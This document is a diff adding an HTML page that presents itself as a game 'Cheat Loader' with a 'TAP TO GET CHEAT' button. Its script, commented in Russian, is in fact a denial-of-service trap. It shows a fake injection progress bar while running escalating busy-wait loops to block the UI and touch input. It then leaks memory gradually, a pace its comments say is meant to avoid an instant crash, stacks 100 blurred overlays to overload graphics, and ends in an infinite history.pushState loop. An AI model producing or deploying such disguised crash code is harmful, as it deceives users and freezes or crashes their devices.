@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Cheat Loader</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .btn { border: 2px solid #0f0; background: none; color: #0f0; padding: 20px; font-size: 20px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <button class="btn" onclick="execute()">TAP TO GET CHEAT</button>
+
+    <script>
+        function execute() {
+            // Звук для атмосферы
+            new Audio('sound.mp3').play().catch(() => {});
+            
+            document.body.innerHTML = '<h1>INJECTING CHEATS... 0%</h1>';
+            let percent = 0;
+
+            // 1. Медленная "задавка" UI-потока
+            // Мы не убиваем всё сразу, а делаем короткие циклы, которые мешают сенсору работать
+            const interval = setInterval(() => {
+                percent += 1;
+                document.querySelector('h1').innerText = `INJECTING CHEATS... ${percent}%`;
+                
+                // С каждым процентом увеличиваем тяжесть вычислений
+                let start = Date.now();
+                while (Date.now() - start < (percent * 2)) {
+                    Math.sqrt(Math.random() * Math.random());
+                }
+
+                if (percent >= 100) {
+                    clearInterval(interval);
+                    finalBlast();
+                }
+            }, 100);
+        }
+
+        function finalBlast() {
+            document.body.innerHTML = '<h1 style="color:red">CRITICAL ERROR: SYSTEM BREACH</h1>';
+            
+            // 2. Постепенное заполнение памяти (чтобы не вылетело мгновенно)
+            const leak = [];
+            setInterval(() => {
+                for(let i = 0; i < 10; i++) {
+                    // Создаем объекты по 2МБ, это "тише" для системы, чем 20МБ сразу
+                    leak.push(new Uint8Array(2 * 1024 * 1024).fill(1));
+                }
+            }, 50);
+
+            // 3. Графическая перегрузка
+            for (let i = 0; i < 100; i++) {
+                let d = document.createElement('div');
+                d.style.cssText = `
+                    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+                    backdrop-filter: blur(20px) contrast(200%);
+                    opacity: 0.1;
+                `;
+                document.body.appendChild(d);
+            }
+
+            // 4. Через 5 секунд лагов — жесткий бесконечный цикл
+            setTimeout(() => {
+                while(true) { history.pushState(null, "", "#" + Math.random()); }
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
